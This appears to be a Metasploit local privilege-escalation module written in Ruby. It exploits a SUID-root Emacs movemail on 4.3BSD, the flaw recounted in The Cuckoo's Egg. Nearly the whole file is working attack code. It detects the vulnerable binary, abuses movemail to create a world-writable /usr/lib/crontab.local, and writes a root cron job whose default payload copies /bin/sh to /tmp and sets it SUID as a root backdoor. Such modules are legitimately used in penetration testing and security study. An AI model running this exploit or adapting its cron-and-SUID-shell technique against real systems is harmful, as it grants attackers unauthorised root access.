# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local

  Rank = ExcellentRanking

  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Emacs movemail Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a SUID installation of the Emacs movemail utility
        to run a command as root by writing to 4.3BSD&#039;s /usr/lib/crontab.local.
        The vulnerability is documented in Cliff Stoll&#039;s book The Cuckoo&#039;s Egg.
      },
      &#039;Author&#039;         => [
        &#039;Markus Hess&#039;, # Discovery? atrun(8) exploit for sure
        &#039;Cliff Stoll&#039;, # The Cuckoo&#039;s Egg hacker tracker
        &#039;wvu&#039;          # Module and additional research
      ],
      &#039;References&#039;     => [
        %w[URL https://en.wikipedia.org/wiki/Movemail],
        %w[URL https://en.wikipedia.org/wiki/The_Cuckoo%27s_Egg],
        %w[URL http://pdf.textfiles.com/academics/wilyhacker.pdf],
        %w[URL https://www.gnu.org/software/emacs/manual/html_node/efaq/Security-risks-with-Emacs.html],
        %w[URL https://www.gnu.org/software/emacs/manual/html_node/emacs/Movemail.html],
        %w[URL https://mailutils.org/manual/html_node/movemail.html]
      ],
      &#039;DisclosureDate&#039; => &#039;1986-08-01&#039;, # Day unknown, assuming first of month
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;SessionTypes&#039;   => %w[shell],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        => {&#039;BadChars&#039; => "\n", &#039;Encoder&#039; => &#039;generic/none&#039;},
      &#039;Targets&#039;        => [[&#039;/usr/lib/crontab.local&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {
        &#039;PAYLOAD&#039;      => &#039;cmd/unix/generic&#039;,
        &#039;CMD&#039;          => &#039;cp /bin/sh /tmp && chmod u+s /tmp/sh&#039;
      }
    ))

    register_options([
      OptString.new(&#039;MOVEMAIL&#039;, [true, &#039;Path to movemail&#039;, &#039;/etc/movemail&#039;])
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ])
  end

  def bin_path
    &#039;/bin:/usr/bin:/usr/ucb:/etc&#039;
  end

  def movemail
    datastore[&#039;MOVEMAIL&#039;]
  end

  def crontab_local
    &#039;/usr/lib/crontab.local&#039;
  end

  def crontab(cmd)
    "* * * * * root #{cmd}\n* * * * * root rm -f #{crontab_local}"
  end

  # uname(1) does not exist, technique from /etc/rc.local
  def is_43bsd?
    cmd_exec(&#039;strings /vmunix | grep UNIX&#039;).include?(&#039;4.3 BSD&#039;)
  end

  # id(1) does not exist
  def is_root?
    cmd_exec(&#039;whoami&#039;).include?(&#039;root&#039;)
  end

  # test -u does not exist
  def setuid_root?(path)
    cmd_exec("find #{path} -user root -perm -4000 -print").include?(path)
  end

  def setup
    super

    vprint_status("Setting a sane $PATH: #{bin_path}")

    case cmd_exec(&#039;echo $SHELL&#039;)
    when %r{/bin/sh}
      vprint_status(&#039;Current shell is /bin/sh&#039;)
      cmd_exec("PATH=#{bin_path}; export PATH")
    when %r{/bin/csh}
      vprint_status(&#039;Current shell is /bin/csh&#039;)
      cmd_exec("setenv PATH #{bin_path}")
    else
      vprint_bad(&#039;Current shell is unknown&#039;)
    end

    vprint_status("$PATH is #{cmd_exec(&#039;echo $PATH&#039;).chomp}")
  end

  def check
    unless is_43bsd?
      vprint_warning(&#039;System does not appear to be 4.3BSD&#039;)
    end

    unless file?(movemail)
      vprint_bad("#{movemail} not found")
      return CheckCode::Safe
    end

    unless movemail.end_with?(&#039;movemail&#039;)
      vprint_warning("#{movemail} has an unexpected name")
    end

    unless setuid_root?(movemail)
      vprint_status("Non-SUID-root #{movemail} found")
      return CheckCode::Detected
    end

    vprint_good("SUID-root #{movemail} found")
    CheckCode::Appears
  end

  def exploit
    if is_root?
      print_good(&#039;Session is already root, executing payload directly&#039;)
      return cmd_exec(payload.encoded)
    end

    unless check == CheckCode::Appears || datastore[&#039;ForceExploit&#039;]
      fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
    end

    # outdesc = open (outname, O_WRONLY | O_CREAT | O_EXCL, 0666);
    if file?(crontab_local)
      fail_with(Failure::NoTarget, "#{crontab_local} already exists")
    end

    print_status(&#039;Preparing crontab with payload&#039;)
    tab = crontab(payload.encoded)
    vprint_line(tab)

    # umask (umask (0) & 0333);
    # (void) ftruncate (indesc, 0L);
    print_status("Creating writable #{crontab_local}")
    cmd_exec("(umask 0 && #{movemail} /dev/null #{crontab_local})")

    unless writable?(crontab_local)
      fail_with(Failure::NoAccess, "#{crontab_local} is not writable")
    end

    print_good("Writing crontab to #{crontab_local}")
    cmd_exec("echo &#039;#{tab.gsub("&#039;", "&#039;\\\\&#039;&#039;")}&#039; > #{crontab_local}")
    print_warning(&#039;Please wait at least one minute for effect&#039;)
  end

end

